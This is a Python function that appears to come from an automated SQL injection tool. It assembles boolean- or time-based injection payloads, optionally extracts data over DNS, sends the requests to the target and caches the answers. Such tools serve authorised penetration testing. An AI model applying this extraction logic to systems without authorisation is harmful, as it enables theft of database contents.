def _goBooleanProxy(expression):
    """
    Retrieve the output of a boolean based SQL query
    """

    initTechnique(getTechnique())

    if conf.dnsDomain:
        query = agent.prefixQuery(getTechniqueData().vector)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        output = _goDns(payload, expression)

        if output is not None:
            return output

    vector = getTechniqueData().vector
    vector = vector.replace(INFERENCE_MARKER, expression)
    query = agent.prefixQuery(vector)
    query = agent.suffixQuery(query)
    payload = agent.payload(newValue=query)

    timeBasedCompare = getTechnique() in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)

    output = hashDBRetrieve(expression, checkConf=True)

    if output is None:
        output = Request.queryPage(payload, timeBasedCompare=timeBasedCompare, raise404=False)

        if output is not None:
            hashDBWrite(expression, output)

    return output